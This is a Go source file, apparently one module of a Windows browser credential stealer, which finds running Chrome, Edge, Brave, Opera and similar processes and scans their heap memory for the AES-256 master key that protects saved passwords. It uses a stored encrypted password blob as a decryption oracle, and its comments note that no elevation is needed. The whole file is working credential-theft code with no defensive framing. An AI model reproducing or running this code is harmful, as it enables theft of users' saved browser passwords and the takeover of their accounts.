//go:build windows

package main

// memkey_windows.go – extract Chrome/Edge AES-256 key from process heap.
//
// Chrome and Edge run at Medium integrity (same as a standard user's processes).
// A same-user process can open them with PROCESS_VM_READ without any elevation.
// The 32-byte AES master key lives as a plain heap allocation; we scan private,
// committed, writable pages and use a known v10/v20 ciphertext as a decryption
// oracle: AES-GCM auth-tag failure is cryptographically guaranteed for the wrong
// key, so false positives are impossible (2^-128 probability).

import (
	"crypto/aes"
	"crypto/cipher"
	"fmt"
	"strings"
	"unicode/utf16"
	"unsafe"
)

// ── additional kernel32 procs ────────────────────────────────────────────────

var (
	procCreateToolhelp32Snapshot = kernel32dll.NewProc("CreateToolhelp32Snapshot")
	procProcess32FirstW          = kernel32dll.NewProc("Process32FirstW")
	procProcess32NextW           = kernel32dll.NewProc("Process32NextW")
	procOpenProcess              = kernel32dll.NewProc("OpenProcess")
	procVirtualQueryEx           = kernel32dll.NewProc("VirtualQueryEx")
	procReadProcessMemory        = kernel32dll.NewProc("ReadProcessMemory")
	procCloseHandle              = kernel32dll.NewProc("CloseHandle")
)

// ── Windows constants ────────────────────────────────────────────────────────

const (
	th32csSnapprocess       = 0x00000002
	processVMRead           = 0x00000010
	processQueryInformation = 0x00000400
	memCommit               = 0x00001000
	memPrivate              = 0x00020000
	pageReadWrite           = 0x04
	pageWritecopy           = 0x08
	pageExecuteReadwrite    = 0x40
	pageExecuteWritecopy    = 0x80
	invalidHandleValue      = ^uintptr(0) // (HANDLE)(-1)
	maxScanRegion           = 256 * 1024 * 1024
)

// ── Windows structs ──────────────────────────────────────────────────────────

// processEntry32W mirrors PROCESSENTRY32W on amd64.
// Go inserts 4 bytes of implicit padding before th32DefaultHeapID
// to satisfy its 8-byte alignment requirement — matching MSVC's layout.
type processEntry32W struct {
	dwSize              uint32
	cntUsage            uint32
	th32ProcessID       uint32
	th32DefaultHeapID   uintptr // offset 16 on amd64 (4 implicit padding bytes at 12-15)
	th32ModuleID        uint32
	cntThreads          uint32
	th32ParentProcessID uint32
	pcPriClassBase      int32
	dwFlags             uint32
	szExeFile           [260]uint16
}

// memoryBasicInformation mirrors MEMORY_BASIC_INFORMATION on amd64 (48 bytes).
// The "spare" field covers PartitionId(2)+padding(2) on Win10+ or pure padding
// on older builds — we don't use it either way.
type memoryBasicInformation struct {
	BaseAddress       uintptr
	AllocationBase    uintptr
	AllocationProtect uint32
	spare             uint32 // PartitionId+pad or pure pad — unused
	RegionSize        uintptr
	State             uint32
	Protect           uint32
	Type              uint32
	pad               uint32
}

// ── helpers ──────────────────────────────────────────────────────────────────

func utf16PtrToStr(p []uint16) string {
	n := 0
	for n < len(p) && p[n] != 0 {
		n++
	}
	return string(utf16.Decode(p[:n]))
}

// highEntropy rejects obvious non-key sequences (all-same-byte, all-zero).
// A valid AES-256 random key has extremely low probability of failing this.
func highEntropy(b []byte) bool {
	if len(b) < 32 {
		return false
	}
	f := b[0]
	for _, v := range b[1:32] {
		if v != f {
			return true
		}
	}
	return false
}

// tryDecryptKey tests whether key correctly decrypts a v10/v20 AES-GCM blob.
// A wrong key will fail the GCM auth-tag check with probability 1 - 2^-128.
func tryDecryptKey(key, ciphertext []byte) bool {
	if len(key) != 32 || len(ciphertext) < 15 {
		return false
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		return false
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return false
	}
	nonce := ciphertext[3:15]
	payload := ciphertext[15:]
	_, err = gcm.Open(nil, nonce, payload, nil)
	return err == nil
}

// ── process enumeration ──────────────────────────────────────────────────────

func findBrowserPIDs(exeNames []string) []uint32 {
	snap, _, _ := procCreateToolhelp32Snapshot.Call(th32csSnapprocess, 0)
	if snap == invalidHandleValue {
		return nil
	}
	defer procCloseHandle.Call(snap)

	var entry processEntry32W
	entry.dwSize = uint32(unsafe.Sizeof(entry))

	var pids []uint32
	ret, _, _ := procProcess32FirstW.Call(snap, uintptr(unsafe.Pointer(&entry)))
	for ret != 0 {
		name := strings.ToLower(utf16PtrToStr(entry.szExeFile[:]))
		for _, want := range exeNames {
			if name == want {
				pids = append(pids, entry.th32ProcessID)
				break
			}
		}
		entry.dwSize = uint32(unsafe.Sizeof(entry))
		ret, _, _ = procProcess32NextW.Call(snap, uintptr(unsafe.Pointer(&entry)))
	}
	return pids
}

// ── memory scanner ───────────────────────────────────────────────────────────

// scanPIDForKey scans private, committed, writable heap pages in the given
// process looking for a 32-byte window that correctly decrypts ciphertext.
func scanPIDForKey(pid uint32, ciphertext []byte) ([]byte, error) {
	handle, _, _ := procOpenProcess.Call(
		processVMRead|processQueryInformation,
		0,
		uintptr(pid),
	)
	if handle == 0 {
		return nil, fmt.Errorf("OpenProcess(%d) denied", pid)
	}
	defer procCloseHandle.Call(handle)

	var addr uintptr
	var mbi memoryBasicInformation
	mbiSize := unsafe.Sizeof(mbi)

	for {
		ret, _, _ := procVirtualQueryEx.Call(handle, addr, uintptr(unsafe.Pointer(&mbi)), mbiSize)
		if ret == 0 {
			break
		}
		regionSize := mbi.RegionSize
		addr += regionSize

		// Only examine private, committed, writable pages (heap).
		if mbi.State != memCommit || mbi.Type != memPrivate {
			continue
		}
		switch mbi.Protect {
		case pageReadWrite, pageWritecopy, pageExecuteReadwrite, pageExecuteWritecopy:
		default:
			continue
		}
		if regionSize == 0 || regionSize > maxScanRegion {
			continue
		}

		buf := make([]byte, regionSize)
		var bytesRead uintptr
		procReadProcessMemory.Call(
			handle,
			mbi.BaseAddress,
			uintptr(unsafe.Pointer(&buf[0])),
			regionSize,
			uintptr(unsafe.Pointer(&bytesRead)),
		)
		if bytesRead < 32 {
			continue
		}
		buf = buf[:bytesRead]

		// Slide a 32-byte window at 16-byte alignment (keys are typically aligned).
		for i := 0; i+32 <= len(buf); i += 16 {
			candidate := buf[i : i+32]
			if !highEntropy(candidate) {
				continue
			}
			if tryDecryptKey(candidate, ciphertext) {
				key := make([]byte, 32)
				copy(key, candidate)
				return key, nil
			}
		}
	}
	return nil, fmt.Errorf("key not found in PID %d", pid)
}

// ── public entry point ───────────────────────────────────────────────────────

// browserExeNames maps a Chromium browser display name to its process EXE.
func browserExeNames(browserName string) []string {
	lower := strings.ToLower(browserName)
	switch {
	case strings.Contains(lower, "edge"):
		return []string{"msedge.exe"}
	case strings.Contains(lower, "brave"):
		return []string{"brave.exe"}
	case strings.Contains(lower, "vivaldi"):
		return []string{"vivaldi.exe"}
	case strings.Contains(lower, "yandex"):
		return []string{"browser.exe"}
	case strings.Contains(lower, "opera"):
		return []string{"opera.exe"}
	default: // Chrome, Chromium, etc.
		return []string{"chrome.exe"}
	}
}

// getKeyFromBrowserMemory extracts the Chrome/Edge AES-256 master key from
// the running browser's heap. Requires no admin rights — same-user Medium
// integrity processes are openly readable via PROCESS_VM_READ.
// ciphertext must be a v10/v20-prefixed encrypted password blob from Login Data.
func getKeyFromBrowserMemory(browserName string, ciphertext []byte) ([]byte, error) {
	if len(ciphertext) < 15 {
		return nil, fmt.Errorf("ciphertext too short for oracle")
	}
	exeNames := browserExeNames(browserName)
	pids := findBrowserPIDs(exeNames)
	if len(pids) == 0 {
		return nil, fmt.Errorf("%s not running", browserName)
	}
	for _, pid := range pids {
		if key, err := scanPIDForKey(pid, ciphertext); err == nil {
			return key, nil
		}
	}
	return nil, fmt.Errorf("key not found in %s process memory", browserName)
}
